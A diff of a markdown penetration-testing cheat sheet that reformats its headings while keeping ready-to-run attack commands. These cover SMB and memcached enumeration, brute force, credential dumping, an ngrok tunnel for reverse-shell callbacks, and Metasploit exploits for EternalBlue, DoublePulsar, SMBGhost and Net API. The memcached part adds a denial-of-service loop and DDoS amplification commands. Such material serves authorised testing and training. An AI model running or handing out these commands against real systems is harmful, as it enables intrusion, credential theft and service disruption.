@@ -361,7 +361,7 @@ msfconsole -qx "
 ```
 
 {% hint style="info" %}
-_Enumerate Windows Users_
+Enumerate Windows Users
 {% endhint %}
 
 ```bash
@@ -372,7 +372,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Enumerate File Shares_
+{% hint style="info" %}
+Enumerate File Shares
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -386,7 +388,9 @@ msfconsole -qx "
 
 #### [Nmap](https://nmap.org/)
 
-_Identify SMB_
+{% hint style="info" %}
+Identify SMB
+{% endhint %}
 
 ```bash
 nmap -p 139,445 \
@@ -394,7 +398,9 @@ nmap -p 139,445 \
      --script smb-protocols,smb-os-discovery,smb2-capabilities $WEBSITE
 ```
 
-_Recon Vulns_
+{% hint style="info" %}
+Recon Vulns
+{% endhint %}
 
 ```bash
 nmap -p 139,445 \
@@ -402,7 +408,9 @@ nmap -p 139,445 \
      --script smb-vuln-*,smb-double-pulsar-backdoor $WEBSITE
 ```
 
-_Brute Force_
+{% hint style="info" %}
+Brute Force
+{% endhint %}
 
 ```bash
 nmap -p 139,445 \
@@ -410,7 +418,9 @@ nmap -p 139,445 \
      --script smb-brute $WEBSITE
 ```
 
-_Enumerate Users and Shares_
+{% hint style="info" %}
+Enumerate Users and Shares
+{% endhint %}
 
 ```bash
 nmap -p 139,445 \
@@ -418,7 +428,9 @@ nmap -p 139,445 \
      --script smb-enum-users,smb-enum-shares $WEBSITE
 ```
 
-_Enumerate Domains and Groups_
+{% hint style="info" %}
+Enumerate Domains and Groups
+{% endhint %}
 
 ```bash
 nmap -p 139,445 \
@@ -426,7 +438,9 @@ nmap -p 139,445 \
      --script smb-enum-domains,smb-enum-groups $WEBSITE
 ```
 
-_Enumerate Services and Processes_
+{% hint style="info" %}
+Enumerate Services and Processes
+{% endhint %}
 
 ```bash
 nmap -p 139,445 \
@@ -436,7 +450,9 @@ nmap -p 139,445 \
 
 #### [netexec](https://github.com/Pennyw0rth/NetExec)
 
+{% hint style="info" %}
 Enum Host
+{% endhint %}
 
 ```bash
 netexec smb $TARGET
@@ -444,7 +460,9 @@ netexec smb $TARGET
 
 #### [enum4linux](https://gitlab.com/kalilinux/packages/enum4linux)
 
-_Enumerate Shares_
+{% hint style="info" %}
+Enumerate Shares
+{% endhint %}
 
 ```bash
 enum4linux -a $TARGET
@@ -452,7 +470,9 @@ enum4linux -a $TARGET
 
 #### [nbtscan](https://salsa.debian.org/pkg-security-team/nbtscan)
 
-_Enumerate Shares_
+{% hint style="info" %}
+Enumerate Shares
+{% endhint %}
 
 ```bash
 nbtscan -r $TARGET/24
@@ -460,7 +480,9 @@ nbtscan -r $TARGET/24
 
 #### [smbclient](https://www.learnlinux.org.za/courses/build/net-admin/ch08s02.html)
 
-_User Enumeration and Null Sessions_
+{% hint style="info" %}
+User Enumeration and Null Sessions
+{% endhint %}
 
 ```bash
 smbclient -N -L //$TARGET
@@ -468,7 +490,9 @@ smbclient -N -L //$TARGET
 
 #### [rpcclient](https://www.samba.org/samba/docs/4.17/man-html/rpcclient.1.html)
 
-_User Enumeration and Null Sessions_
+{% hint style="info" %}
+User Enumeration and Null Sessions
+{% endhint %}
 
 ```bash
 rpcclient -U "" $TARGET
@@ -476,7 +500,9 @@ rpcclient -U "" $TARGET
 
 #### [Metasploit](https://www.metasploit.com/)
 
-_Detect Version_
+{% hint style="info" %}
+Detect Version
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -486,7 +512,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Enumerate Users_
+{% hint style="info" %}
+Enumerate Users
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -496,7 +524,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Enumerate Shares_
+{% hint style="info" %}
+Enumerate Shares
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -506,7 +536,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Credential Dumps_
+{% hint style="info" %}
+Credential Dumps
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -516,7 +548,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Credential Brute Force_
+{% hint style="info" %}
+Credential Brute Force
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -528,7 +562,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Detect EternalBlue_
+{% hint style="info" %}
+Detect EternalBlue
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -538,19 +574,25 @@ msfconsole -qx "
     exit"
 ```
 
-_Start Ngrok_
+{% hint style="info" %}
+Start Ngrok
+{% endhint %}
 
 ```bash
 ngrok http 4444 >/dev/null 2>&1 &
 ```
 
-_Define ENV Ngrok_
+{% hint style="info" %}
+Define ENV Ngrok
+{% endhint %}
 
 ```bash
 NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
 ```
 
-_Cert Spoof_
+{% hint style="info" %}
+Cert Spoof
+{% endhint %}
 
 ```bash
 rm -rf /home/$USER/.msf4/loot/*
@@ -561,13 +603,17 @@ msfconsole -qx "
     exit"
 ```
 
-_Define ENV Cert_
+{% hint style="info" %}
+Define ENV Cert
+{% endhint %}
 
 ```bash
 CERT=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.pem" -printf "%f\n" | head -n 1)
 ```
 
-_Post-EXP_
+{% hint style="info" %}
+Post-EXP
+{% endhint %}
 
 ```bash
 cat > /tmp/post-exp.rc << EOF
@@ -586,7 +632,9 @@ bg
 EOF
 ```
 
-_EternalBlue Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)_
+{% hint style="info" %}
+EternalBlue Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -604,7 +652,9 @@ msfconsole -qx "
     run -j"
 ```
 
-_Doublepulsar Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)_
+{% hint style="info" %}
+Doublepulsar Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -622,7 +672,9 @@ msfconsole -qx "
     run -j"
 ```
 
-_SMBGhost Exploit (Win 10)_
+{% hint style="info" %}
+SMBGhost Exploit (Win 10)
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -640,7 +692,9 @@ msfconsole -qx "
     run -j"
 ```
 
-_Net API Exploit (Win XP's)_
+{% hint style="info" %}
+Net API Exploit (Win XP's)
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -662,7 +716,9 @@ msfconsole -qx "
 
 #### [Nmap](https://nmap.org/)
 
-_Identify Memcached_
+{% hint style="info" %}
+Identify Memcached
+{% endhint %}
 
 ```bash
 nmap -p 11211 -sS -sV --mtu 5000 --script memcached-info $WEBSITE
@@ -670,49 +726,65 @@ nmap -p 11211 -sS -sV --mtu 5000 --script memcached-info $WEBSITE
 
 #### [Netcat](https://nmap.org/ncat/)
 
-_Get Version_
+{% hint style="info" %}
+Get Version
+{% endhint %}
 
 ```bash
 echo "version" | nc -vn -w 1 $TARGET 11211
 ```
 
+{% hint style="info" %}
 _Get Status_
+{% endhint %}
 
 ```bash
 echo "stats" | nc -vn -w 1 $TARGET 11211
 ```
 
+{% hint style="info" %}
 _Get Slabs_
+{% endhint %}
 
 ```bash
 echo "stats slabs" | nc -vn -w 1 $TARGET 11211
 ```
 
-_Get Items_
+{% hint style="info" %}
+Get Items
+{% endhint %}
 
 ```bash
 echo "stats items" | nc -vn -w 1 $TARGET 11211
 ```
 
-_Get Key Names_
+{% hint style="info" %}
+Get Key Names
+{% endhint %}
 
 ```bash
 echo "stats cachedump 1 10" | nc -vn -w 1 $TARGET 11211
 ```
 
-_Get Info Saved_
+{% hint style="info" %}
+Get Info Saved
+{% endhint %}
 
 ```bash
 echo "get $ITEM" | nc -vn -w 1 $TARGET 11211
 ```
 
-_Denial of Service_
+{% hint style="info" %}
+Denial of Service
+{% endhint %}
 
 ```bash
 for i in {1..10000}; do echo "set key$i 0 0 1024" | nc $TARGET 11211; done
 ```
 
-_DDoS Amplification_
+{% hint style="info" %}
+DDoS Amplification
+{% endhint %}
 
 ```bash
 echo -e "\x00\x00\x00\x00\x00\x01\x00\x00stats\n" | nc -u -q 1 $TARGET 11211
@@ -720,19 +792,25 @@ echo -e "\x00\x00\x00\x00\x00\x01\x00\x00stats\n" | nc -u -q 1 $TARGET 11211
 
 #### [libmemcached-tools](https://libmemcached.org/libMemcached.html)
 
-_Get Stats_
+{% hint style="info" %}
+Get Stats
+{% endhint %}
 
 ```bash
 memcstat --servers=$TARGET
 ```
 
-_Get all items_
+{% hint style="info" %}
+Get all items
+{% endhint %}
 
 ```bash
 memcdump --servers=$TARGET
 ```
 
-_Get info inside the item(s)_
+{% hint style="info" %}
+Get info inside the item(s)
+{% endhint %}
 
 ```bash
 memccat --servers=$TARGET $ITEM1 $ITEM2 $ITEM3
@@ -740,13 +818,17 @@ memccat --servers=$TARGET $ITEM1 $ITEM2 $ITEM3
 
 [Metasploit](https://www.metasploit.com/)
 
-_Extract Slabs_
+{% hint style="info" %}
+Extract Slabs
+{% endhint %}
 
 ```bash
 msfconsole -qx "use auxiliary/gather/memcached_extractor;set RHOSTS $TARGET;run;exit"
 ```
 
-_Denial of Service_
+{% hint style="info" %}
+Denial of Service
+{% endhint %}
 
 ```bash
 msfconsole -qx "use auxiliary/dos/misc/memcached;set RHOSTS $TARGET;run;exit"
